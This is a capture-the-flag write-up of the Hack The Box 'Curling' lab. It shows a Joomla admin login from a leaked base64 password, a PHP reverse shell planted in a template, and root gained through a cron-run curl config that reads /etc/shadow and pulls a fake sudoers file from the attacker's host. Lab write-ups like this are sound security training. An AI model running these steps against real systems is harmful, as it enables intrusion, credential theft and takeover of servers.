# HTB - Curling

#### Ip: 10.129.130.63
#### Name: Curling
#### Rating: Easy

------------------------------------------------

Curling.png

#### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 5000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Curling]
└─$ sudo nmap -p- --min-rate 5000 -sC -sV 10.129.130.63
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-06 09:18 CST
Nmap scan report for 10.129.130.63
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8ad169b490203ea7b65401eb68303aca (RSA)
|   256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA)
|_  256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.21 seconds
```

Looking at the site on port 80 we find a Joomla blog:

htb_curling_site.png

Running joomscan we find the target is running Joomla 3.8.8

htb_curling_joomscan.png

Looking around the site we discover a possible username:

```
Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!

- Floris
```

Scrolling down to the bottom of the page source we find a comment:

htb_curling_source.png

If we navigate to http://10.129.130.63/secret.txt we find some base64:

```
Q3VybGluZzIwMTgh
```

Let's decode this:

```
┌──(ryan㉿kali)-[~/HTB/Curling]
└─$ echo "Q3VybGluZzIwMTgh" | base64 -d                                 
Curling2018!  
```

We can't use this for SSH as user Floris, but we can use it to login to the site at http://10.129.130.63/administrator:

htb_curling_in.png

### Exploitation

From here we can obtain a shell by overwriting a template with a reverse shell.

We can go to Templates > Templates > Prostar > and scroll down to and select error.php.

Let's overwrite this code with PentestMonkey's famous php-reverse-shell.php

htb_curling_edit.png

Once this is saved we can set up a listener, and navigate to 10.129.130.63/templates/protostar/error.php?

Which triggers our reverse shell as www-data:

```
┌──(ryan㉿kali)-[~/HTB/Curling]
└─$ nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.14.114] from (UNKNOWN) [10.129.130.63] 56634
Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 16:18:32 up  1:02,  0 users,  load average: 0.00, 0.09, 1.24
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname
curling
```

From here we will need to move laterally to get access to the first flag:

```
www-data@curling:/home/floris$ ls
admin-area  password_backup  user.txt
www-data@curling:/home/floris$ cat user.txt
cat: user.txt: Permission denied
```
Inside user floris's home directory there is an interesting file called password_backup

htb_curling_backup.png

Decoding this was tricky, and I relied on ChatGPTs help.

First, I had ChatGPT isolate the hex characters for me. Then i converted the hex file to a bin file. I knew this was going to be a bzip2 file from the string `BZh91AY&SY`. From here I used bzip to extract to a file called file.bin.out

```
┌──(ryan㉿kali)-[~/HTB/Curling]
└─$ cat >> file.hex     
425a 6839 3141 5926 5359 819b bb48 0000
17ff fffc 41cf 05f9 5029 6176 61cc 3a34
4edc cccc 6e11 5400 23ab 4025 f802 1960
2018 0ca0 0092 1c7a 8340 0000 0000 0000
0680 6988 3468 6469 89a6 d439 ea68 c800
000f 51a0 0064 681a 069e a190 0000 0034
6900 0781 3501 6e18 c2d7 8c98 874a 13a0
0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78
f53e 0809 f073 5654 c27a 4886 dfa2 e931
c856 921b 1221 3385 6046 a2dd c173 0d22
b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290
ad6b b12f 0813 8120 8205 a5f5 2970 c503
37db ab3b e000 ef85 f439 a414 8850 1843
8259 be50 0986 1e48 42d5 13ea 1c2a 098c
8a47 ab1d 20a7 5540 72ff 1772 4538 5090
819b bb48
^C
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Curling]
└─$ xxd -r -p file.hex file.bin
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Curling]
└─$ file file.bin
file.bin: bzip2 compressed data, block size = 900k
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Curling]
└─$ bzip2 -d file.bin
bzip2: Can't guess original name for file.bin -- using file.bin.out
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Curling]
└─$ cat file.bin.out
�l[password�r�BZh91AY&SY6Ǎ����@@!PtD�� t"d�hhOPIS@��6��8ET>P@�#I bՃ|3��x���������(*N�&�H��k1��x��"�{�ೱ��]��B@�6�m��
```

From here I used binwalk to attempt extracting the contents:

```
┌──(ryan㉿kali)-[~/HTB/Curling]
└─$ binwalk -e file.bin.out

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             gzip compressed data, has original file name: "password", from Unix, last modified: 2018-05-22 19:16:20
24            0x18            bzip2 compressed data, block size = 900k
```

I then entered the created directory and discovered a credential:

htb_curling_pass.png

`5d<wdCbdZu)|hChXll`

Which doesn't work for root, but does work for floris:

```
www-data@curling:/home/floris$ su floris 
Password: 
floris@curling:~$ whoami
floris
```

And we can now grab the first flag:

htb_curling_user.png

### Privilege Escalation

Loading up pspy to view cronjobs, we see the following command being executed every minute with root permissions:

```
curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```

htb_curling_cron.png

And fortunately for us, we have write access over both these files:

```
floris@curling:~/admin-area$ ls -la
total 28
drwxr-x--- 2 root   floris  4096 Aug  2  2022 .
drwxr-xr-x 6 floris floris  4096 Aug  2  2022 ..
-rw-rw---- 1 root   floris    25 Mar  6 17:14 input
-rw-rw---- 1 root   floris 14248 Mar  6 17:14 report
```

Currently the script is just calling localhost and writing it to report.

Let's abuse curl here and use the cronjob to read the `/etc/shadow` file, and write it out to a file in `tmp`:

```
floris@curling:~/admin-area$ cat input 
url = file:///127.0.0.1/../../../etc/shadow
-o /tmp/test3.txt
```

After a minute the script runs and we can view the file:

```
floris@curling:~/admin-area$ cat /tmp/test3.txt 
root:$6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c.bljjnn6FMF1:17673:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
```

However I was unable to crack this hash using john and unshadow.

Going back to the drawing board I decided to host a phony `/etc/sudoers` file on my attacking machine, and use the cronjob to fetch it and overwrite the actual `/etc/sudoers` file on the target, giving floris full permissions:

```
┌──(ryan㉿kali)-[~/HTB/Curling]
└─$ cat sudoers.txt
floris ALL=(root) NOPASSWD: ALL
```

I then set up a Python server and updated the input script to:

```
floris@curling:~/admin-area$ nano input 
floris@curling:~/admin-area$ cat input 
url = "http://10.10.14.114/sudoers.txt"
-o /etc/sudoers
-X GET
```

And once the cronjob runs and my file overwrites the existing sudoers file, we can simply `sudo su -` for a root shell:

htb_curling_shell.png

From here we can grab the final flag:

htb_curling_root.png

Thanks for following along!

-Ryan

--------------------------------